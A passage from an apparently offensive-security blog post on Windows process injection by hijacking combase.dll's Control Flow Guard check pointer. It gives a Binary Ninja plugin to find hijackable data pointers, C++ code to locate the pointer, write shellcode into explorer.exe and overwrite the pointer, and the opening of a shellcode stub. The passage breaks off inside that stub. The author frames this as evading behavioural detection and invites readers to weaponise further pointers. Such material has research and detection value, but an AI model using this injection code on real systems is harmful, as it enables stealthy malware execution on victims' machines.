@@ -1,0 +1,544 @@
+# https://www.legacyy.xyz/defenseevasion/windows/2025/04/16/control-flow-hijacking-via-data-pointers.html
+
+<!DOCTYPE html><html lang="en">
+<body>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+
+  
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>When performing process injection, one of the most important IOCs that make up behavioural signatures is passing execution to our shellcode. Whilst there are multiple techniques to doing so and this is certainly nothing purely “new” - in this post I want to showcase not just a “new proof-of-concept technique”, but the entire process I went through in hope that this can become a proper addition to a capability developer’s skill set.</p>
+
+<p>Since the release of <a href="https://github.com/CCob/ThreadlessInject">ThreadlessInject</a> by <a href="https://x.com/_EthicalChaos_">@_EthicalChaos_</a> I have really enjoyed playing around with hijacking control flow via various pointers on a system, particularly those in memory regions that are marked as readable and writeable as it avoids noisy calls such as <code class="language-plaintext highlighter-rouge">VirtualProtect</code> and it’s alternatives.</p>
+
+<h1 id="contents">Contents</h1>
+
+<ol>
+  <li><a href="https://www.legacyy.xyz/defenseevasion/windows/2025/04/16/control-flow-hijacking-via-data-pointers.html#what-is-a-data-pointer">What is a Data Pointer?</a></li>
+  <li><a href="https://www.legacyy.xyz/defenseevasion/windows/2025/04/16/control-flow-hijacking-via-data-pointers.html#enumerating-hijackable-data-pointers">Enumerating Hijackable Data Pointers</a>
+    <ul>
+      <li><a href="https://www.legacyy.xyz/defenseevasion/windows/2025/04/16/control-flow-hijacking-via-data-pointers.html#finding-by-hand">Finding Manually</a></li>
+      <li><a href="https://www.legacyy.xyz/defenseevasion/windows/2025/04/16/control-flow-hijacking-via-data-pointers.html#finding-automatically">Finding Automatically</a></li>
+    </ul>
+  </li>
+  <li><a href="https://www.legacyy.xyz/defenseevasion/windows/2025/04/16/control-flow-hijacking-via-data-pointers.html#writing-a-proof-of-concept">Writing a Proof of Concept</a>
+    <ul>
+      <li><a href="https://www.legacyy.xyz/defenseevasion/windows/2025/04/16/control-flow-hijacking-via-data-pointers.html#locating-pointers-in-memory">Locating pointers in memory</a></li>
+      <li><a href="https://www.legacyy.xyz/defenseevasion/windows/2025/04/16/control-flow-hijacking-via-data-pointers.html#writing-shellcode-to-the-target-process">Writing Shellcode to the Target Process</a></li>
+      <li><a href="https://www.legacyy.xyz/defenseevasion/windows/2025/04/16/control-flow-hijacking-via-data-pointers.html#writing-a-shellcode-stub">Writing a Shellcode Stub</a></li>
+    </ul>
+  </li>
+  <li><a href="https://www.legacyy.xyz/defenseevasion/windows/2025/04/16/control-flow-hijacking-via-data-pointers.html#full-source-code">Full Source Code</a></li>
+</ol>
+
+<h1 id="what-is-a-data-pointer">What is a Data Pointer?</h1>
+
+<p>What I have dubbed a “data pointer” is simply a value in a readable and writeable memory section of a binary that points to a function to be called by code.</p>
+
+<p>For a simple example, let’s take a look at the following source code:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="k">volatile</span> <span class="n">FARPROC</span> <span class="n">pointer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="k">volatile</span> <span class="kt">int</span> <span class="nf">func</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">pointer</span> <span class="o">=</span> <span class="p">(</span><span class="n">FARPROC</span><span class="p">)</span><span class="n">func</span><span class="p">;</span>
+
+	<span class="n">printf</span><span class="p">(</span>
+		<span class="s">"pointer</span><span class="se">\t</span><span class="s">@ 0x%016llx</span><span class="se">\n</span><span class="s">"</span>
+		<span class="s">"func</span><span class="se">\t</span><span class="s">@ 0x%016llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+		<span class="n">func</span><span class="p">,</span> <span class="n">pointer</span><span class="p">);</span>
+
+	<span class="n">pointer</span><span class="p">();</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>For those unfamiliar, you can ignore the <code class="language-plaintext highlighter-rouge">volatile</code> keyword in the source code for now, its only purpose here is to stop the compiler from optimising out the <code class="language-plaintext highlighter-rouge">func</code> function.</p>
+
+<p>As you can see, we have a global variable <code class="language-plaintext highlighter-rouge">pointer</code> which at runtime is set to point to the <code class="language-plaintext highlighter-rouge">func</code> function. This is later used to call <code class="language-plaintext highlighter-rouge">func</code> after the <code class="language-plaintext highlighter-rouge">printf</code> call. Put simply, if we can overwrite <code class="language-plaintext highlighter-rouge">pointer</code>, we can control which code is executed by the <code class="language-plaintext highlighter-rouge">pointer()</code> line. This can be shown further by taking a look at a decompilation of the executable.</p>
+
+<p><img src="https://www.legacyy.xyz/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/example_decompilation.png" alt="Image of binary ninja decompilation of example main function. Hijacking the &quot;pointer&quot; global variable"></p>
+
+<h1 id="enumerating-hijackable-data-pointers">Enumerating Hijackable Data Pointers</h1>
+
+<p>The first step to this process is selecting target binaries to hunt for hijacks within. For my goals (process injection) I chose those within <code class="language-plaintext highlighter-rouge">KnownDlls</code> as these are not only commonly used DLLs across the system, but they are also all loaded at the same base virtual address in every process. This means that we can simply locate the pointers in memory of our loader process, and perform a single write to the remote process to perform the hijack.</p>
+
+<h2 id="finding-by-hand">Finding By Hand</h2>
+
+<p>I first started taking a look at <code class="language-plaintext highlighter-rouge">ntdll.dll</code> as I figured if I could find and hijack a commonly called pointer, it meant I could hijack control flow of almost any process on the system. There was no magic here, I just manually checked references to every entry in the <code class="language-plaintext highlighter-rouge">.data</code> section of <code class="language-plaintext highlighter-rouge">ntdll</code> until I found call references within Binary Ninja.</p>
+
+<p>As shown below, here are some exemplary (albeit not very useful) pointers that could be overwritten to hijack calls to <code class="language-plaintext highlighter-rouge">RtlpDebugPageHeapCreate</code>, <code class="language-plaintext highlighter-rouge">RtlpDebugPageHeapDestroy</code>, and in rare cases <code class="language-plaintext highlighter-rouge">RtlCreateHeap</code> and <code class="language-plaintext highlighter-rouge">RtlDestroyHeap</code>.</p>
+
+<p><img src="https://www.legacyy.xyz/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/enumerating_pointers_by_hand.png" alt="Image of binary ninja decompilation of ntdll.dll, showing two hijackable pointers"></p>
+
+<p>As you have probably noticed, this is a huge time sink and can be automated in a variety of ways.</p>
+
+<h2 id="finding-automatically">Finding Automatically</h2>
+
+<p>To find these pointers automatically we need to perform one of the following:</p>
+
+<ul>
+  <li>Enumerate values in <code class="language-plaintext highlighter-rouge">.data</code> for references which are <code class="language-plaintext highlighter-rouge">call</code> instructions</li>
+  <li>Find a code pattern (e.g. <code class="language-plaintext highlighter-rouge">jmp rax</code> instructions) that we can search for in the <code class="language-plaintext highlighter-rouge">.text</code> section.</li>
+</ul>
+
+<p>The first approach is much more viable, however at the time of writing said plugin, I had ran into issues with the Binary Ninja API when enumerating code references, and as such I went with option two.</p>
+
+<p>If we take a look at the LLIL (low-level interpreted language) of the exemplary hijackable pointers in <code class="language-plaintext highlighter-rouge">ntdll.dll</code>, we will see the following <code class="language-plaintext highlighter-rouge">&lt;return&gt; tailcall(rax)</code> pattern.</p>
+
+<p><img src="https://www.legacyy.xyz/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/hijack_pattern_llil.png" alt="Image of binary ninja decompilation of RtlpDebugPageHeapDestroy, showing the `<return> tailcall(rax)` pattern"></p>
+
+<p>This is a pretty consistent pattern throughout various hijackable pointers, and as such I wrote a small (terribly written) Binary Ninja plugin to enumerate this pattern, and check if the value in rax was within the <code class="language-plaintext highlighter-rouge">.data</code> section and print the output to the log.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">binaryninja</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="k">def</span> <span class="nf">scan</span><span class="p">(</span><span class="n">bv</span><span class="p">:</span> <span class="n">BinaryView</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">data_section</span><span class="p">:</span> <span class="n">Section</span> <span class="o">=</span> <span class="n">bv</span><span class="p">.</span><span class="n">sections</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">".data"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">data_section</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Failed to find .data section"</span><span class="p">)</span>
+        <span class="k">return</span>
+    
+    <span class="n">data_start</span> <span class="o">=</span> <span class="n">data_section</span><span class="p">.</span><span class="n">start</span>
+    <span class="n">data_end</span> <span class="o">=</span> <span class="n">data_section</span><span class="p">.</span><span class="n">end</span>
+    
+    <span class="k">for</span> <span class="n">func</span> <span class="ow">in</span> <span class="n">bv</span><span class="p">.</span><span class="n">functions</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="n">func</span><span class="p">.</span><span class="n">llil</span><span class="p">.</span><span class="n">basic_blocks</span><span class="p">:</span>
+                <span class="n">instructions</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
+                <span class="k">if</span> <span class="nb">str</span><span class="p">(</span><span class="n">instructions</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">==</span> <span class="s">"&lt;return&gt; tailcall(rax)"</span><span class="p">:</span>
+                    <span class="n">ops</span> <span class="o">=</span> <span class="n">instructions</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">operands</span>
+                    <span class="k">if</span> <span class="n">ops</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">"rax"</span><span class="p">:</span>
+                        <span class="n">data_ptr</span> <span class="o">=</span> <span class="n">ops</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">src</span><span class="p">.</span><span class="n">value</span><span class="p">.</span><span class="n">value</span>
+                        <span class="k">if</span> <span class="n">data_ptr</span> <span class="o">&lt;</span> <span class="n">data_start</span> <span class="ow">or</span> <span class="n">data_ptr</span> <span class="o">&gt;</span> <span class="n">data_end</span><span class="p">:</span>
+                            <span class="k">continue</span>
+                        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">".data hijack: [</span><span class="si">{</span><span class="n">func</span><span class="p">.</span><span class="n">name</span><span class="si">}</span><span class="s">] ptr: @</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">data_ptr</span><span class="p">)</span><span class="si">}</span><span class="s"> (.data offset: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">data_ptr</span> <span class="o">-</span> <span class="n">data_start</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">ILException</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Could not load llil for function </span><span class="si">{</span><span class="n">func</span><span class="p">.</span><span class="n">name</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span>
+
+
+<span class="c1"># Init &amp; register the plugin
+</span><span class="n">PluginCommand</span><span class="p">.</span><span class="n">register</span><span class="p">(</span><span class="s">"DataHijack</span><span class="se">\\</span><span class="s">Scan Hijacks"</span><span class="p">,</span> <span class="s">"Scan for hijacks"</span><span class="p">,</span> <span class="n">scan</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Running this on <code class="language-plaintext highlighter-rouge">ntdll.dll</code> gives the following output, which in fact does show us the pointer we found manually:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ScriptingProvider] .data hijack: [RtlpDebugPageHeapDestroy] ptr: @0x180166420 (.data offset: 0x420)
+</code></pre></div></div>
+
+<p>After experimenting with various target DLLs I eventually stumbled upon these Control Flow Guard pointers in <code class="language-plaintext highlighter-rouge">combase.dll</code>, <img src="https://www.legacyy.xyz/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/combase_hijackable_pointers.png" alt="Binary Ninja decompilation of combase.dll `.data` section"></p>
+
+<p>The target pointer of interest is <code class="language-plaintext highlighter-rouge">__guard_check_icall_fptr</code> as it is referenced by ~2000 functions that have been automatically generated by the MIDL compiler as stub functions for COM proxying. <a href="https://learn.microsoft.com/en-us/windows/win32/api/rpcproxy/nf-rpcproxy-ndrproxyforwardingfunction13">Read more here</a>.</p>
+
+<p><img src="https://www.legacyy.xyz/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/combase_references.png" alt="BinaryNinja decompilation of combase.dll, showing call references of hijackable pointer"></p>
+
+<h1 id="writing-a-proof-of-concept">Writing a Proof of Concept</h1>
+
+<p>Now that we have our target pointer (<code class="language-plaintext highlighter-rouge">combase.dll!__guard_check_icall_fptr</code>), we can start writing a proof of concept for this, for purposes of this post we will be weaponising it as process injection. The POC will have to perform the following:</p>
+
+<ol>
+  <li>Locate the target pointer in memory of the current process</li>
+  <li>Construct a shellcode stub to ensure clean, non-blocking execution of the payload</li>
+  <li>Write both stub and shellcode to target process</li>
+  <li>Overwrite the pointer in the remote process</li>
+</ol>
+
+<h2 id="locating-pointers-in-memory">Locating Pointers in Memory</h2>
+
+<p>Thanks to our target binary being within <code class="language-plaintext highlighter-rouge">KnownDlls</code>, we can just locate the pointer in our own process, as it will be located at the same base address in our target process.</p>
+
+<p>The first step is to locate the base address of our target binary, since this is just a proof of concept, we can use <code class="language-plaintext highlighter-rouge">LoadLibrary</code> to do so.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HMODULE</span> <span class="n">combase</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"combase.dll"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Next comes the more difficult part. We need to locate the address of that pointer in memory, but also have our POC function well across windows versions. Luckily for us, some of these <code class="language-plaintext highlighter-rouge">NdrProxy</code> functions are exported by combase, and as such we can egghunt within them for the pointer.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FARPROC</span> <span class="n">NdrProxyForwardingFunction13</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">combase</span><span class="p">,</span> <span class="s">"NdrProxyForwardingFunction13"</span><span class="p">);</span>
+<span class="n">LOG_INFO</span><span class="p">(</span><span class="s">"NdrProxyForwardingFunction13 @ 0x%016llx"</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">NdrProxyForwardingFunction13</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>As we want this to work cross-version, instead of using a static offset from the binary base, we will use the highlighted instructions to locate the reference in memory and parse it that way.</p>
+
+<p><img src="https://www.legacyy.xyz/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/finding_egg.png" alt="Binary Ninja disassembly of combase.dll!NdrProxyForwardingFunction13 to show the egg we will hunt for"></p>
+
+<p>It is important to note that the last instruction (the <code class="language-plaintext highlighter-rouge">call</code>) is a relative call based on <code class="language-plaintext highlighter-rouge">rip</code>. As such, we will need to take this offset, and add it to the address of the next instruction in memory in order to calculate our pointer’s location.</p>
+
+<p>For those who are less familiar with assembly, I recommend playing around with <a href="https://defuse.ca/online-x86-assembler.htm#disassembly2">Defuse’s online assembler</a></p>
+
+<p>In this case, we can see that <code class="language-plaintext highlighter-rouge">ff 15</code> corresponds to the type of call instruction, and <code class="language-plaintext highlighter-rouge">e7 c3 17 00</code> is the offset in little endian format.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ff 15 e7 c3 17 00       call   QWORD PTR [rip+0x17c3e7]
+</code></pre></div></div>
+
+<p>Now that we know our egg, we can define and hunt for it as follows, we will be using the EggHunt function from VX-API (thanks vx-underground &lt;3):</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//</span>
+<span class="c1">// Search a region of memory for an egg. Returns NULL on failure.</span>
+<span class="c1">//</span>
+<span class="n">PVOID</span> <span class="nf">EggHunt</span><span class="p">(</span><span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">RegionStart</span><span class="p">,</span> <span class="n">_In_</span> <span class="n">SIZE_T</span> <span class="n">RegionLength</span><span class="p">,</span> <span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">Egg</span><span class="p">,</span> <span class="n">_In_</span> <span class="n">SIZE_T</span> <span class="n">EggLength</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">RegionStart</span> <span class="o">||</span> <span class="o">!</span><span class="n">RegionLength</span> <span class="o">||</span> <span class="o">!</span><span class="n">Egg</span> <span class="o">||</span> <span class="o">!</span><span class="n">EggLength</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">CHAR</span><span class="o">*</span> <span class="n">pchar</span> <span class="o">=</span> <span class="p">(</span><span class="n">CHAR</span><span class="o">*</span><span class="p">)</span><span class="n">RegionStart</span><span class="p">;</span> <span class="n">RegionLength</span> <span class="o">&gt;=</span> <span class="n">EggLength</span><span class="p">;</span> <span class="o">++</span><span class="n">pchar</span><span class="p">,</span> <span class="o">--</span><span class="n">RegionLength</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">pchar</span><span class="p">,</span> <span class="n">Egg</span><span class="p">,</span> <span class="n">EggLength</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">pchar</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">HMODULE</span> <span class="n">combase</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"combase.dll"</span><span class="p">);</span>
+    
+    <span class="n">FARPROC</span> <span class="n">NdrProxyForwardingFunction13</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">combase</span><span class="p">,</span> <span class="s">"NdrProxyForwardingFunction13"</span><span class="p">);</span>
+    <span class="n">LOG_INFO</span><span class="p">(</span><span class="s">"NdrProxyForwardingFunction13 @ 0x%016llx"</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">NdrProxyForwardingFunction13</span><span class="p">);</span>
+
+    <span class="n">BYTE</span> <span class="n">egg___guard_check_icall_fptr</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span>        <span class="c1">// mov     r10, qword [rcx]</span>
+        <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span>  <span class="c1">// mov     rcx, qword [r10+0x68]</span>
+        <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x15</span>               <span class="c1">// call    qword [rel __guard_check_icall_fptr]  {_guard_check_icall_nop}</span>
+        <span class="c1">// next 4 bytes are the offset</span>
+    <span class="p">};</span>
+
+    <span class="n">BYTE</span><span class="o">*</span> <span class="n">egg_location</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">EggHunt</span><span class="p">(</span><span class="n">NdrProxyForwardingFunction13</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">egg___guard_check_icall_fptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">egg___guard_check_icall_fptr</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">egg_location</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">LOG_ERROR</span><span class="p">(</span><span class="s">"Failed to locate __guard_check_icall_fptr call offset @ combase.dll!NdrProxyForwardingFunction13"</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">BYTE</span><span class="o">*</span> <span class="n">egg_end</span> <span class="o">=</span> <span class="n">egg_location</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">egg___guard_check_icall_fptr</span><span class="p">);</span>
+    <span class="n">LOG_INFO</span><span class="p">(</span><span class="s">"combase.dll!__guard_check_icall_fptr egg @ %p"</span><span class="p">,</span> <span class="n">egg_location</span><span class="p">);</span>
+    <span class="n">LOG_INFO</span><span class="p">(</span><span class="s">"combase.dll!__guard_check_icall_fptr egg_end @ %p"</span><span class="p">,</span> <span class="n">egg_end</span><span class="p">);</span>
+
+	<span class="n">DWORD</span> <span class="n">offset</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">egg_end</span><span class="p">;</span>
+    <span class="n">LOG_INFO</span><span class="p">(</span><span class="s">"combase.dll!__guard_check_icall_fptr call offset =&gt; 0x%08lx"</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+    <span class="n">FARPROC</span><span class="o">*</span> <span class="n">__guard_check_icall_fptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">FARPROC</span><span class="o">*</span><span class="p">)(</span><span class="n">egg_end</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">));</span>
+    <span class="n">FARPROC</span> <span class="n">_guard_check_icall_nop</span> <span class="o">=</span> <span class="o">*</span><span class="n">__guard_check_icall_fptr</span><span class="p">;</span>
+    <span class="n">LOG_SUCCESS</span><span class="p">(</span><span class="s">"combase.dll!__guard_check_icall_fptr @ %p"</span><span class="p">,</span> <span class="n">__guard_check_icall_fptr</span><span class="p">);</span>
+    <span class="n">LOG_SUCCESS</span><span class="p">(</span><span class="s">"combase.dll!_guard_check_icall_nop @ %p"</span><span class="p">,</span> <span class="n">_guard_check_icall_nop</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Running this to test gives us the following output, confirming that we have successfully located our pointer in memory:</p>
+
+<p><img src="https://www.legacyy.xyz/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/testing_pointer_location.png" alt="Screenshot of terminal output from POC, showing that we have successfully located combase.dll!__guard_check_icall_fptr"></p>
+
+<h2 id="writing-shellcode-to-the-target-process">Writing Shellcode to the Target Process</h2>
+
+<p>Since making this specific part of process injection “stealthy” isn’t the goal of this post, we will simply use the <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> and <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> WinAPIs to do so. The <code class="language-plaintext highlighter-rouge">0xc0</code> is the size of the stub rounded up to the nearest 16 bytes to ensure that everything is aligned correctly.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BYTE</span><span class="o">*</span> <span class="n">base_address</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">base_address</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="overwriting-pointers-in-a-target-process">Overwriting Pointers in a Target Process</h2>
+
+<p>For the purposes of testing, I will be using <code class="language-plaintext highlighter-rouge">explorer.exe</code>. This is because explorer is both a relatively safe process to crash (it restarts itself) and it is very heavily reliant on COM proxying, hence even right clicking will trigger our control flow hijack.</p>
+
+<p>As for actually writing the pointer, we will again use <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> to do so as follows. You may notice that <code class="language-plaintext highlighter-rouge">VirtualProtect</code> is being used here, and that’s because we are using a pointer in <code class="language-plaintext highlighter-rouge">.rdata</code> for this post, as I don’t want to burn other pointers. <strong>Finding a better pointer is left to the reader, you can weaponise many pointers using this exact methodology.</strong></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="n">BOOL</span> <span class="n">success</span> <span class="o">=</span> <span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">__guard_check_icall_fptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">),</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
+<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">__guard_check_icall_fptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">base_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="n">success</span> <span class="o">=</span> <span class="n">VirtualProtectEx</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">__guard_check_icall_fptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">),</span> <span class="n">oldprotect</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>At this point, we can give the POC a quick test, and we have shellcode execution!</p>
+
+<p><img src="https://www.legacyy.xyz/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/testing_poc_basic.png" alt="Testing the basic POC and we see shellcode execution via calc.exe launching"></p>
+
+<p>There are however two issues:</p>
+
+<ul>
+  <li>Target process either crashes or hangs after executing the shellcode</li>
+  <li>Pointer is not restored after execution, meaning multiple shells may be caught creating unnecessary noise</li>
+</ul>
+
+<h2 id="writing-a-shellcode-stub">Writing a Shellcode Stub</h2>
+
+<p>Our shellcode stub will perform the following:</p>
+
+<ol>
+  <li>Restore the original pointer value to prevent multiple callbacks</li>
+  <li>Execute the payload in a new thread</li>
+  <li>Return cleanly to the original</li>
+</ol>
+
+<p>To save us a lot of time, and to make use of compiler optimisations, we can actually just write C and compile via a non-MSVC compiler in order to compile position independent code. We can do that as follows using <code class="language-plaintext highlighter-rouge">x86_64-w64-mingw32-gcc</code>.</p>
+
+<p><strong>source code</strong></p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">stub</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// save registers</span>
+    <span class="k">asm</span><span class="p">(</span>
+        <span class="s">"push rax</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"push rdi</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"push rcx</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"push rdi</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"push rsi</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"push r8</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"push r9</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"push r10</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"push r11</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"push r12</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"push r13</span><span class="se">\n</span><span class="s">"</span>
+    <span class="p">);</span>
+
+    <span class="c1">// placeholder variables that we will replace in the loader</span>
+    <span class="n">tVirtualProtect</span> <span class="n">VirtualProtect</span> <span class="o">=</span> <span class="p">(</span><span class="n">tVirtualProtect</span><span class="p">)</span><span class="mh">0x1111111111111111</span><span class="p">;</span>
+    <span class="n">tCreateThread</span> <span class="n">CreateThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">tCreateThread</span><span class="p">)</span><span class="mh">0x2222222222222222</span><span class="p">;</span>
+    <span class="n">FARPROC</span><span class="o">*</span> <span class="n">icall_fptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">FARPROC</span><span class="o">*</span><span class="p">)</span><span class="mh">0x3333333333333333</span><span class="p">;</span>
